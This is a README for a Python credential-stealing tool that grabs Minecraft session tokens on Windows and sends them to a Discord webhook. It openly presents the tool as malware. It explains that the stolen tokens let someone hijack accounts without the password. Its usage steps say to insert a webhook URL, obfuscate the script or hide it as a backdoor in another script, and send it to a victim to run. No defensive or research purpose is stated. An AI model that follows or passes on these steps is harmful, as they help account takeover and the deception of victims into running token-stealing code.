<h1 align="center">Minecraft Session Token Stealer</h1>
<p align="center">A Minecraft session token stealer written in Python 3.</p>

**What can I use the session tokens for?** You can use session tokens to hijack accounts (gain access to them without having their password) temporarily, as if they restart their game, their session token will get changed.

This version of the stealer only supports **Windows**.

# How to use
 1. Create a webhook on your Discord server. I recommend creating a new server.
 2. Change the 'WEBHOOK HERE' variable value to your Discord webhook URL in [token-stealer.py](token-stealer.py)
 3. *(obfuscate the code or install it as a backdoor in an other script.)*
 4. Send the script to your victim and make them run it.
